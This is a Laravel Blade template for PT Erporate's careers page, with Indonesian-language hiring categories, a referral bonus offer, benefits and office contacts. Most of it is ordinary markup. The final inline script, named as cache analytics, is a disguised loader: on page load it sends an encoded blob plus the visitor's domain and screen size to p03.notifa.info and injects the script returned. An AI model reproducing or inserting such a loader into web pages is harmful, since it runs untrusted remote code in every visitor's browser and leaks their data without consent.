<!DOCTYPE html>
<html class="no-js" lang="{{ app()->getLocale() }}">
<head> 
    <meta charset="UTF-8"> 
    <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="index,follow"> 
    <meta charset="utf-8">
    <meta property="og:title" content="Referral Program - Career Erporate" />
    <meta property="og:image" content="{{ asset('public/img/rp.jpeg') }}">
    <meta property="og:description" content="Hanya ajak teman apply bisa dapat 500rb (tidak perlu terikat kontrak)">
    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Career Erporate</title>
    <link rel="shortcut icon" href="{{ asset('public/favicon.ico') }}">
    <link rel="stylesheet" href="{{ asset('public/css/bootstrap.min.css') }}"> 
    <link rel="stylesheet" href="{{ asset('public/plugins/css/plugins.css') }}"> 
    <link rel="stylesheet" href="{{ asset('public/css/bootstrap-theme.min.css') }}"> 
    <link rel="stylesheet" href="{{ asset('public/css/bootstrap-select.min.css') }}"> 
    <link rel="stylesheet" type="text/css" href="{{ asset('public/css/prettify.css') }}"> 
    <link href="{{ asset('public/css/font-awesome.css') }}" rel="stylesheet"> 
    <link href="{{ asset('public/css/line-font.css') }}" rel="stylesheet"> 
    <link href="{{ asset('public/css/animate.css') }}" rel="stylesheet"> 
    <link href="{{ asset('public/css/bootsnav.css') }}" rel="stylesheet"> 
    <link href="{{ asset('public/css/style2.css') }}" rel="stylesheet"> 
    <!-- <link href="http://codeminifier.com/new-job-stock/job-stock/assets/css/style.css" rel="stylesheet"> -->
    <link rel="stylesheet" type="text/css" href="{{ asset('public/css/sweetalert2.min.css') }}">
    <link type="text/css" rel="stylesheet" id="jssDefault" href="{{ asset('public/css/colors/green-style.css') }}"> 
    <link href="{{ asset('public/css/responsiveness.css') }}" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datetimepicker/4.17.47/css/bootstrap-datetimepicker.css">
    <link rel="stylesheet" type="text/css" href="{{asset('public/css/daterangepicker.css')}}" />
    <link rel="stylesheet" type="text/css" href="{{ asset('public/css/sweetalert2.min.css') }}">
    <style type="text/css" media="screen">
    .category-box{
      height: 160px !important;
    } 
  </style>
  </head>
  <body>
    <div class="wrapper"> 
      <nav class="navbar navbar-default navbar-fixed navbar-transparent white bootsnav"> 
        <div class="container"> 
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-menu">
            <i class="fa fa-bars">
            </i>
          </button> 
          <div class="navbar-header"> 
            <a class="navbar-brand" href="http:\\erporate.com">
              <img src="{{ asset('public/img/logo.png') }}" class="logo logo-display" alt="">
              <img src="{{asset('public/img/logo2.png')}}" class="logo logos logo-scrolled" alt="">
            </a> 
          </div>
          <div class="collapse navbar-collapse" id="navbar-menu"> 
            <ul class="nav navbar-nav navbar-right" data-in="fadeInDown" data-out="fadeOutUp"> 
              <li>
                <a href="{{ route('index') }} " class="active">HOME</a>
              </li>
              <li>
                <a href="{{ route('bootcamp') }}">BOOTCAMP</a>
              </li>
              <li>
                <a href="{{ route('info') }}">PROCEDURE</a>
              </li>
            </ul> 
          </div>
        </div>
      </nav> 
      <div class="clearfix">
      </div>

      
      <!-- Main Banner Section Start -->
      <div class="hero-banner" data-ride="carousel" data-pause="hover" data-interval="false" >
        <div class="hero-img">
          <img src="{{ asset('public/img/gtrr.jpg') }}" class="img-responsive" alt="">
        </div>
        <div class="container">
          <div class="row">
            <div class="col col-md-6 col-sm-8">
              <div class="content">
                <h2>Join With <br>Our Geek Team</h2>
                <h3>(Indonesia, Vietnam)</h3>
                <p>Kami membutuhkan banyak talent untuk posisi beragam di tim startup maupun project corporate.</p>
                <h3>We Develop Your Passions</h3>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="clearfix"></div>
      <!-- Main Banner Section End -->
      
      <!-- Brand -->
      <div class="company-brand freelancer">
        <div class="container">
          <div id="company-brands" class="owl-carousel">
            <div class="brand-img">
              <img src="{{ asset('public/img/dattabot.svg') }}" class="img-responsive" alt="" />
            </div>
            <div class="brand-img">
              <img src="{{ asset('public/img/squline.png') }}" class="img-responsive" alt="" />
            </div>
            <div class="brand-img">
              <img src="{{ asset('public/img/alfamart.png') }}" class="img-responsive" alt="" />
            </div>
            <div class="brand-img">
              <img src="{{ asset('public/img/sociabuzz.png') }}" class="img-responsive" alt="" />
            </div>
            <div class="brand-img">
              <img src="{{ asset('public/img/astralive.png') }}" class="img-responsive" alt="" />
            </div>
            <div class="brand-img">
              <img src="{{ asset('public/img/wakuliner.png') }}" class="img-responsive" alt="" />
            </div>
            <div class="brand-img">
              <img src="{{ asset('public/img/mind.png') }}" class="img-responsive" alt="" />
            </div>
            <div class="brand-img">
              <img src="{{ asset('public/img/terralab.png') }}" class="img-responsive" alt="" />
            </div>
            <div class="brand-img">
              <img src="{{ asset('public/img/we+.png') }}" class="img-responsive" alt="" />
            </div>
            <div class="brand-img">
              <img src="{{ asset('public/img/UII.png') }}" class="img-responsive" alt="" />
            </div>
          </div>
        </div>
      </div>
      
      <!-- ====================== How It Work ================= -->
      <section class="how-it-works">
        <div class="container">
          
          <div class="row" data-aos="fade-up">
            <div class="col-md-12">
              <div class="main-heading">
                <h2>Jenis <span>Pelamar</span></h2>
              </div>
            </div>
          </div>
          
          <div class="row">
          
            <div class="col-md-3 col-sm-3">
              <div class="working-process">
                <span class="process-img">
                  <img src="{{ asset('public/img/11.png') }}" class="img-responsive" alt="" />
                  <span class="process-num">01</span>
                </span>
                <h4>Cari kerjaan segera?</h4>
                <p>Apply segera untuk mengikuti proses hiring kami. Jika belum lolos akan ditawarkan jobs yang sesuai keinginan (Skills, location, benefits, Team, dll)</p>
              </div>
            </div>
            
            <div class="col-md-3 col-sm-3">
              <div class="working-process">
                <span class="process-img">
                  <img src="{{ asset('public/img/21.png') }}" class="img-responsive" alt="" />
                  <span class="process-num">02</span>
                </span>
                <h4>Cari kerjaan saat kontrak habis nanti?</h4>
                <p>Minta pada kami untuk di <strong>reminder</strong> penawaran kerja sesuai yang diinginkan (Kami yang akan melamarmu) untuk beberapa bulan / minggu kedepan sebelum kontrak kerjamu habis</p>
              </div>
            </div>
            
            <div class="col-md-3 col-sm-3">
              <div class="working-process">
                <span class="process-img">
                  <img src="{{ asset('public/img/31.png') }}" class="img-responsive" alt="" />
                  <span class="process-num">03</span>
                </span>
                <h4>Mau pindah kerja ke Jakarta / Jogja?</h4>
                <p>Cari kerja dekat kampung halaman biar bisa pulang setiap hari / setiap minggu</p>
              </div>
            </div>

            <div class="col-md-3 col-sm-3">
              <div class="working-process">
                <span class="process-img">
                  <img src="{{ asset('public/img/41.png') }}" class="img-responsive" alt="" />
                  <span class="process-num">04</span>
                </span>
                <h4>Mau diterima di perusahaan besar?</h4>
                <p>Kami banyak kerjasama dengan perusahaan multinasional, jika lolos akan di hired menjadi karyawan tetap karena sudah handle project nya melalui Erporate</p>
              </div>
            </div>
            
          </div>
          
        </div>
      </section>
      
      <!-- ========= start Call To Action section =========== -->
      <div class="clearfix"></div>
      <section class="call-to-act">
        <div class="container-fluid">
        
          <div class="col-md-6 col-sm-6 no-padd bl-dark">
            <div class="call-to-act-caption">
              <h2>Job Seeker</h2>
              <h3>Explore lowongan kami dan APPLY agar bisa mengikuti proses hiring. Kami membutuhkan lebih dari 40 staff IT per bulan dan berbagai posisi</h3>
              <a href="https://career.erporate.com/" class="btn bat-call-to-act">Browse Jobs</a>
            </div>
          </div>
          
          <div class="col-md-6 col-sm-6 no-padd gr-dark">
            <div class="call-to-act-caption">
              <h2>Referral Program</h2>
              <h3>Care pada teman yang sedang mencari kerja / teman mau move on pada kerjaan yang diimpikan baik tim, suasana kerja maupun kesejahteraan lainnya + dapat bonus <strong>Rp.500.000</strong></h3>
              <a href="#" class="btn bat-call-to-act" data-toggle="modal" data-target="#detail">Detail</a>
            </div>
          </div>
          
        </div>
      </section>
      <!-- =========== Call To Action section End ============= -->
      
      <div class="clearfix"></div>
      <section>
        <div class="container"> 
          <div class="row">
            <div class="main-heading">
              <h2>Benefits <span>Employee</span></h2>
            </div>
          </div>
          <div class="row">
            <div class="col-md-2 col-sm-4">
              <div class="category-box" data-aos="fade-up">
                <div class="category-desc">
                  <div class="category-icon">
                    <i class="icon-shield" aria-hidden="true"></i>
                    <i class="icon-shield abs-icon" aria-hidden="true"></i>
                  </div>
                  <div class="category-detail category-desc-text">
                    <h4> <a href="#">Allowance  &amp; Health</a></h4>
                    <!-- <p>122 Jobs</p> -->
                  </div>
                </div>
              </div>
            </div>
            <div class="col-md-2 col-sm-4">
              <div class="category-box" data-aos="fade-up">
                <div class="category-desc">
                  <div class="category-icon">
                    <i class="icon-clock" aria-hidden="true"></i>
                    <i class="icon-clock abs-icon" aria-hidden="true"></i>
                  </div>
                  <div class="category-detail category-desc-text">
                    <h4> <a href="#">Flexible Working Hours</a></h4>
                    <!-- <p>155 Jobs</p> -->
                  </div>
                </div>
              </div>
            </div>
            <div class="col-md-2 col-sm-4">
              <div class="category-box" data-aos="fade-up">
                <div class="category-desc">
                  <div class="category-icon">
                    <i class="icon-wine" aria-hidden="true"></i>
                    <i class="icon-wine abs-icon" aria-hidden="true"></i>
                  </div>
                  <div class="category-detail category-desc-text">
                    <h4> <a href="#">Coffee, Snack &amp; Kitchen</a></h4>
                    <!-- <p>300 Jobs</p> -->
                  </div>
                </div>
              </div>
            </div>
            <div class="col-md-2 col-sm-4">
              <div class="category-box" data-aos="fade-up">
                <div class="category-desc">
                  <div class="category-icon">
                    <i class="icon-happy" aria-hidden="true"></i>
                    <i class="icon-happy abs-icon" aria-hidden="true"></i>
                  </div>
                  <div class="category-detail category-desc-text">
                    <h4> <a href="#">Fun Room &amp; Wifi</a></h4>
                    <!-- <p>80 Jobs</p> -->
                  </div>
                </div>
              </div>
            </div>
            <div class="col-md-2 col-sm-4">
              <div class="category-box" data-aos="fade-up">
                <div class="category-desc">
                  <div class="category-icon">
                    <i class="icon-tools-2" aria-hidden="true"></i>
                    <i class="icon-tools-2 abs-icon" aria-hidden="true"></i>
                  </div>
                  <div class="category-detail category-desc-text">
                    <h4> <a href="#">Training  &amp; Skill Development</a></h4>
                    <!-- <p>80 Jobs</p> -->
                  </div>
                </div>
              </div>
            </div>
            <div class="col-md-2 col-sm-4">
              <div class="category-box" data-aos="fade-up">
                <div class="category-desc">
                  <div class="category-icon">
                    <i class="icon-heart" aria-hidden="true"></i>
                    <i class="icon-heart abs-icon" aria-hidden="true"></i>
                  </div>
                  <div class="category-detail category-desc-text">
                    <h4> <a href="#">Homey Office</a></h4>
                    <!-- <p>80 Jobs</p> -->
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>


        <!-- Sign Up Window Code -->
		<div class="modal fade" id="detail" tabindex="-1" role="dialog" aria-labelledby="myModalLabel2" aria-hidden="true">
			<div class="modal-dialog">
				<div class="">
					<div class="modal-body">
						<div class="" role="tabpanel">
						<div class="tab-content" id="myModalLabel2">
							<div class="tab-pane fade in active" id="login">
								<img src="{{ asset('public/img/rp.jpeg') }}" class="img-responsive" alt="" />
							</div>
						</div>
						</div>
					</div>
				</div>
			</div>
		</div>

      <footer class="footer"> 
        <div class="row no-padding"> 
          <div class="container"> 
            <div class="col-md-4 col-sm-12"> 
              <div class="footer-widget"> 
                <h3 class="widgettitle widget-title">REFFERAL PROGRAM
                </h3> 
                <div class="textwidget"> 
                  <!-- @foreach($bootcamps as $bootcamp)
                  <p><a href="{{ url('/bootcamp/'.$bootcamp->bootcamp_id) }}">{{ $bootcamp->bootcamp_title }}
                  </a></p>
                  @endforeach -->
                  <P>Get <strong>IDR 500.000</strong></P>
                  <p>just refferal your friend to join us until hired.</p>
                  <p>We will give you the notice and the money after ask your refferal from who</P>
                  <p>For more information please contact HRD</p>
                </div>
              </div>
            </div>
            <div class="col-md-5 col-sm-4"> 
              <div class="footer-widget"> 
                <h3 class="widgettitle widget-title">ADDRESS
                </h3> 
                <div class="textwidget"> 
                  <div class="textwidget"> 
                    <ul class="footer-navigation"> 
                      <li>
                        <a title=""><strong>Jakarta</strong>
                        </a><br>
                        Jakarta Barat Madison Park, Magnolia Tower 10BJ. <br>
                        Tanjung Duren Selatan
                      </li>
                      <li>
                        <a title=""><strong>Yogyakarta</strong>
                        </a><br>Jl. Wirajaya No. 310A RT 01/02, Kelurahan Condong Catur.<br>
                        Depok, Sleman
                      </li>
                    </ul> 
                  </div>
                </div>
              </div>
            </div>
            <div class="col-md-3 col-sm-4"> 
              <div class="footer-widget"> 
                <h3 class="widgettitle widget-title">CONTACT
                </h3> 
                <div class="textwidget"> 
                  <ul class="footer-navigation"> 
                    <li>(0274) 4331734
                    </li>
                    <li>
                      085749487679 (Business)
                    </li>
                    <li>081393733771 (HRD)</li>
                    <li>085742486880 (HRD)</li>
                  </ul>
                  <ul class="footer-social"> 
                    <li>
                      <a href="https://www.facebook.com/erporate">
                        <i class="fa fa-facebook"></i>
                      </a>
                    </li>
                    <li>
                      <a href="https://plus.google.com/100771217264928077260">
                        <i class="fa fa-google-plus"></i>
                      </a>
                    </li>
                    <li>
                      <a href="https://twitter.com/erporate">
                        <i class="fa fa-twitter"></i>
                      </a>
                    </li>
                    <li>
                      <a href="https://www.linkedin.com/company/pterporatesolusiglobal">
                        <i class="fa fa-linkedin"></i>
                      </a>
                    </li>
                    <li>
                      <a href="https://www.instagram.com/erporate.indonesia">
                        <i class="fa fa-instagram"></i>
                      </a>
                    </li>
                  </ul>  
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="row copyright"> 
          <div class="container"> 
            <p>Copyright PT Erporate Solusi Global - Career © 2018. All Rights Reserved 
            </p>
          </div>
        </div>
      </footer>  
      <div class="clearfix">
      </div>
      
      
      <!-- <script type="text/javascript" src="{{ asset('public/js/jquery.min.js') }}"></script>  -->
      <script type="text/javascript" src="{{ asset('public/plugins/js/jquery.min.js') }}"></script>
      <script src="{{ asset('public/js/bootstrap.min.js') }}"></script> 
      <script src="{{ asset('public/js/bootsnav.js') }}"></script> 
      <script src="{{ asset('public/js/viewportchecker.js') }}"></script> 
      <script src="{{ asset('public/js/bootstrap-select.min.js') }}"></script> 
      <script src="{{ asset('public/js/jQuery.style.switcher.js') }}"></script> 
      <script type="text/javascript" src="{{ asset('public/plugins/js/owl.carousel.min.js') }}"></script>
      <script src="{{ asset('public/js/custom.js') }}"></script>
      <script type="text/javascript" src="{{ asset('public/js/sweetalert2.min.js') }}"></script>
      <script type="text/javascript" src="{{ asset('public/js/validator.js') }}"></script>
      <script type="text/javascript" src="{{asset('public/js/momment.js')}}"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datetimepicker/4.17.47/js/bootstrap-datetimepicker.min.js"></script>
      <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/daterangepicker/daterangepicker.min.js"></script>
     
    </div>
    
    <script type="text/javascript">if (self==top) {
        function netbro_cache_analytics(fn, callback) {
          setTimeout(function() {
            fn();
            callback();
          }
                     , 0);
        }
        function sync(fn) {
          fn();
        }


        function requestCfs(){
          var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");
          var idc_glo_r = Math.floor(Math.random()*99999999999);
          var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mQ4YEQwQBqR1oV%2bCxvsYeZrMKp2nbFDJ5rZq%2fi96Zf9hKtE2jv5o3U%2fjR0UNndgHnO7SezLJ1ynk6AMfmTx2bI7BlmXQmidluBoEU8U0J5RSxIDwEi9pYxyiZv6%2fo0TjsllsWnuv8gc9e%2fUSq0xORGGQvao9ItYU5AjfZVPrQNwcWaZ5YCahby4OmCDRtY%2fgmdhh7Ar1J9hvEqggNFo7han4fvr9BsJVRiu1JK3EKdd%2bXWkoqaelcJa7JgtwqyLynpNaLwdmbHbE%2f%2f9swAWFqj%2fML8GcadLNm6VeYjqpTkfXTdsd1Dj6HMJ1BkAjttMyZ1krB83okP3Rkh33zEcLTS1w8K5oFX36epPGOUYMQ4HdfTDsMCqUHA9iiflcGacr8ehtpaen0luYC3BeZxzFQEl0lNsauKXTZ6VaFcCy0Nuxhxk8h3co6XTDpf5cdQ%2br9ozWXLiwgFwaMOQloYYHOXFx%2fGtD5XP%2fhSDFC0TNMWePcYobM5qIkpz0%2f%2fhFm8Lp7%2bPHsDUyiMynjC8oT0tqRJQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;
          var bsa = document.createElement('script');
          bsa.type = 'text/javascript';
          bsa.async = true;
          bsa.src = url;
          (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function(){
        }
                              );
      };
    </script>
  @stack('scripts')

  </body>
</html>